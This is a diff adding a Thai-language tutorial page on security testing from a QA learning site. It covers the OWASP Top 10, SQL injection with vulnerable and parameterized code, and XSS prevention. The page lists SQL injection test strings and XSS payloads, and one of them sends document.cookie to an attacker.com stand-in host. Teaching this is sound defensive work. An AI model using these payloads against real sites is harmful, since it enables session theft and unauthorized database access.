@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Testing - QA Learning Hub</title>
+    <link rel="stylesheet" href="../css/style.css">
+    <link rel="stylesheet" href="../css/topic.css">
+    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="../index.html" class="nav-logo">
+                <span class="logo-icon">🧪</span>
+                <span class="logo-text">QA Learning Hub</span>
+            </a>
+            <ul class="nav-menu">
+                <li><a href="../index.html" class="nav-link">← กลับสู่หน้าหลัก</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <main class="topic-page">
+        <div class="topic-header">
+            <div class="container">
+                <div class="topic-meta">
+                    <span class="topic-level-badge advanced">Advanced</span>
+                    <span class="topic-category">Non-Functional Testing</span>
+                </div>
+                <h1>🔒 Security Testing</h1>
+                <p class="topic-description">ทดสอบความปลอดภัย หาช่องโหว่ OWASP Top 10</p>
+            </div>
+        </div>
+
+        <div class="topic-content">
+            <div class="container">
+                <nav class="toc">
+                    <h3>📋 สารบัญ</h3>
+                    <ul>
+                        <li><a href="#owasp">OWASP Top 10</a></li>
+                        <li><a href="#sql">SQL Injection</a></li>
+                        <li><a href="#xss">XSS</a></li>
+                        <li><a href="#tools">Security Testing Tools</a></li>
+                        <li><a href="#quiz">แบบทดสอบ</a></li>
+                    </ul>
+                </nav>
+
+                <article class="content-body">
+                    <section id="owasp">
+                        <h2>🛡️ OWASP Top 10 (2021)</h2>
+                        
+                        <p>OWASP (Open Web Application Security Project) จัดอันดับความเสี่ยงด้านความปลอดภัยที่พบบ่อยที่สุด</p>
+
+                        <table class="owasp-table">
+                            <tr>
+                                <th>Rank</th>
+                                <th>Vulnerability</th>
+                                <th>คำอธิบาย</th>
+                            </tr>
+                            <tr>
+                                <td>A01</td>
+                                <td>Broken Access Control</td>
+                                <td>การควบคุมสิทธิ์มีปัญหา</td>
+                            </tr>
+                            <tr>
+                                <td>A02</td>
+                                <td>Cryptographic Failures</td>
+                                <td>การเข้ารหัสผิดพลาด</td>
+                            </tr>
+                            <tr>
+                                <td>A03</td>
+                                <td>Injection</td>
+                                <td>SQL, NoSQL, OS command injection</td>
+                            </tr>
+                            <tr>
+                                <td>A04</td>
+                                <td>Insecure Design</td>
+                                <td>ออกแบบระบบไม่ปลอดภัย</td>
+                            </tr>
+                            <tr>
+                                <td>A05</td>
+                                <td>Security Misconfiguration</td>
+                                <td>ตั้งค่าความปลอดภัยผิด</td>
+                            </tr>
+                            <tr>
+                                <td>A06</td>
+                                <td>Vulnerable Components</td>
+                                <td>ใช้ component/library ที่มีช่องโหว่</td>
+                            </tr>
+                            <tr>
+                                <td>A07</td>
+                                <td>Auth Failures</td>
+                                <td>การยืนยันตัวตนผิดพลาด</td>
+                            </tr>
+                            <tr>
+                                <td>A08</td>
+                                <td>Data Integrity Failures</td>
+                                <td>ความสมบูรณ์ข้อมูลผิดพลาด</td>
+                            </tr>
+                            <tr>
+                                <td>A09</td>
+                                <td>Security Logging Failures</td>
+                                <td>ไม่มีการบันทึกเหตุการณ์ความปลอดภัย</td>
+                            </tr>
+                            <tr>
+                                <td>A10</td>
+                                <td>SSRF</td>
+                                <td>Server-Side Request Forgery</td>
+                            </tr>
+                        </table>
+                    </section>
+
+                    <section id="sql">
+                        <h2>💉 SQL Injection</h2>
+
+                        <h3>อะไรคือ SQL Injection?</h3>
+                        <p>การโจมตีโดยแทรก SQL code เข้าไปใน input fields เพื่อ manipulate database</p>
+
+                        <div class="code-block bad">
+                            <h4>❌ Vulnerable Code</h4>
+                            <pre><code class="language-python"># ไม่ปลอดภัย! ต่อ string ตรงๆ
+query = "SELECT * FROM users WHERE username = '" + username + "'"
+cursor.execute(query)</code></pre>
+                        </div>
+
+                        <div class="code-block good">
+                            <h4>✅ Secure Code (Parameterized Query)</h4>
+                            <pre><code class="language-python"># ปลอดภัย - ใช้ parameterized query
+query = "SELECT * FROM users WHERE username = %s"
+cursor.execute(query, (username,))</code></pre>
+                        </div>
+
+                        <h3>🧪 วิธีทดสอบ SQL Injection</h3>
+                        <div class="code-block">
+                            <pre><code># Test Inputs สำหรับ SQL Injection
+' OR '1'='1
+' OR 1=1--
+' UNION SELECT * FROM users--
+admin'--
+' OR '1'='1' /*
+
+# ถ้า login ผ่าน = มีช่องโหว่!</code></pre>
+                        </div>
+                    </section>
+
+                    <section id="xss">
+                        <h2>🔴 Cross-Site Scripting (XSS)</h2>
+
+                        <h3>ประเภทของ XSS</h3>
+                        <ul>
+                            <li><strong>Stored XSS</strong> - Script เก็บไว้ใน database</li>
+                            <li><strong>Reflected XSS</strong> - Script อยู่ใน URL/params</li>
+                            <li><strong>DOM-based XSS</strong> - เกิดจาก client-side JavaScript</li>
+                        </ul>
+
+                        <h3>🧪 วิธีทดสอบ XSS</h3>
+                        <div class="code-block">
+                            <pre><code># Test Payloads
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
+
+# ถ้า alert ขึ้น = มีช่องโหว่!</code></pre>
+                        </div>
+
+                        <h3>✅ การป้องกัน XSS</h3>
+                        <ul>
+                            <li>Escape output (HTML encoding)</li>
+                            <li>Content Security Policy (CSP)</li>
+                            <li>Input validation</li>
+                            <li>HttpOnly cookie flag</li>
+                        </ul>
+                    </section>
+
+                    <section id="tools">
+                        <h2>🛠️ Security Testing Tools</h2>
+
+                        <div class="tools-grid">
+                            <div class="tool-card">
+                                <h4>🕷️ OWASP ZAP</h4>
+                                <p>Free web app security scanner</p>
+                                <span class="tool-tag">Open Source</span>
+                            </div>
+                            <div class="tool-card">
+                                <h4>🐶 Burp Suite</h4>
+                                <p>Professional security testing</p>
+                                <span class="tool-tag">Free/Paid</span>
+                            </div>
+                            <div class="tool-card">
+                                <h4>🔍 Nmap</h4>
+                                <p>Network scanning</p>
+                                <span class="tool-tag">Open Source</span>
+                            </div>
+                            <div class="tool-card">
+                                <h4>📊 Nessus</h4>
+                                <p>Vulnerability scanner</p>
+                                <span class="tool-tag">Commercial</span>
+                            </div>
+                        </div>
+                    </section>
+
+                    <section id="quiz" class="quiz-section">
+                        <h2>🧠 แบบทดสอบ</h2>
+                        
+                        <div class="quiz-container">
+                            <div class="quiz-question" data-answer="a">
+                                <p><strong>คำถาม 1:</strong> วิธีป้องกัน SQL Injection ที่ดีที่สุดคือ?</p>
+                                <div class="quiz-options">
+                                    <label><input type="radio" name="q1" value="a"> Parameterized Queries</label>
+                                    <label><input type="radio" name="q1" value="b"> Input validation เท่านั้น</label>
+                                    <label><input type="radio" name="q1" value="c"> Escape characters ทั้งหมด</label>
+                                </div>
+                                <div class="quiz-feedback"></div>
+                            </div>
+
+                            <button class="btn btn-primary" onclick="checkAnswers()">ตรวจคำตอบ</button>
+                            <div id="quiz-result"></div>
+                        </div>
+                    </section>
+
+                    <section class="completion-section">
+                        <button class="btn btn-complete" onclick="markTopicComplete('topics/security-testing.html')">
+                            ✅ ฉันเรียนจบบทนี้แล้ว
+                        </button>
+                    </section>
+                </article>
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div class="container">
+            <p>© 2026 QA Learning Hub | สร้างด้วย ❤️ สำหรับ QA ทุกคน</p>
+        </div>
+    </footer>
+
+    <script src="../js/topic.js"></script>
+    <script>
+        function checkAnswers() {
+            const questions = document.querySelectorAll('.quiz-question');
+            let correct = 0;
+            questions.forEach(q => {
+                const answer = q.dataset.answer;
+                const selected = q.querySelector('input[type="radio"]:checked');
+                const feedback = q.querySelector('.quiz-feedback');
+                if (selected) {
+                    if (selected.value === answer) {
+                        feedback.innerHTML = '<span class="correct">✅ ถูกต้อง!</span>';
+                        correct++;
+                    } else {
+                        feedback.innerHTML = '<span class="incorrect">❌ ลองใหม่</span>';
+                    }
+                } else {
+                    feedback.innerHTML = '<span class="incorrect">⚠️ เลือกคำตอบ</span>';
+                }
+            });
+            const resultDiv = document.getElementById('quiz-result');
+            if (correct === questions.length) {
+                resultDiv.innerHTML = '<div class="success-message">🎉 ยินดีด้วย!</div>';
+            }
+        }
+    </script>
+</body>
+</html>
